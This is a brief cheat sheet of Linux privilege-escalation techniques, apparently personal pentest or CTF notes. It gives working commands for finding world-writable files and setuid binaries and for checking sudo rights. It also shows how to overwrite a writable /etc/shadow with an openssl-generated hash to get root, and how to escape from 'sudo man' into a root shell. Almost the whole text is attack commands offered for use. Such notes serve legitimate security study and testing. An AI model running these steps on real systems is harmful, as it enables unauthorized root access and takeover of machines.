Step 1: The following command will look for files (and not symlinks etc) which is world writable. 
Command: `find / -not -type l -perm -o+w`

if /etc/shadow is world-writable and root password is not set, generate a root password and insert it into /etc/shadow to gain root access with known creds
`openssl passwd -1 -salt abc password`
copy the outputted password and enter it into /etc/shadow

find setuid programs
`find / -user root -perm -4000 -exec ls -ldb {} \;`

sudo capabilities
`sudo -l`

if man can be run without password, run it and launch /bin/bash from inside
`sudo man ls`
`!/bin/bash`
